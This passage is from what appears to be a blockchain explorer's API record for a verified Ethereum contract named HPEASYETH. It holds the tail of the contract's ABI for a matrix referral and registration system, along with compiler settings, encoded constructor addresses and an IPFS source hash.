},{\"internalType\":\"uint256\",\"name\":\"matrix_referrer\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"direct_referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"from_hpeasy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"cycles\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"bunch_cycles\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"matrixId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"matrixReferrals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"newOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"paymentQueue\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"is_eth_paid\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"is_tokens_paid\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"matrix_to_renew\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"purchaseHpEasyPosition\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"receiveTransfer\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"status\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"regCost\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"register\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"matrixToRenew\",\"type\":\"uint256\"}],\"name\":\"renewMatrix\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"skippedHpEasysOffset\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFunds\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"useTokenPayment\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"matrices_cnt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"current_matrix\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"last_matrix\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"hpeasy_cooldown_time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"hpeasy_cooldown_num\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_referrals\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"usersById\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"usersMatrices\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"HPEASYETH","CompilerVersion":"v0.6.12+commit.27d51765","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"000000000000000000000000803c698f680e702609fb09f7782bea2ccd3cbda00000000000000000000000009e43f77f2484d2b9b1e2f88b2ce186147bcf459000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000008000000000000000000000000b01e70b4d1775335364d16467009062f2259ec6c0000000000000000000000001ff60a59e4e349c55cf133cc95a9a6cf3a5085f7000000000000000000000000115a844fabb3d725f7da4aaf1bc78b196faaff5700000000000000000000000007a778d40f87977c65f74983e731c32a6d8b4b25000000000000000000000000d8835cb071aaf9b56b1ad296415e5e3a17a9ad8e0000000000000000000000007b820202e85ba5927d77999c205f1d90a139ef1f000000000000000000000000e7b3c2c91f80517ddeff6ad4c9701e28a192f02f000000000000000000000000e8bb290eead75e1b4f616bf0c99b7f60cf20ba93","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://b6984df243ad098ca5cd593ac85ae8201991fde9b57a71fcb8279ea96221bbca"}]}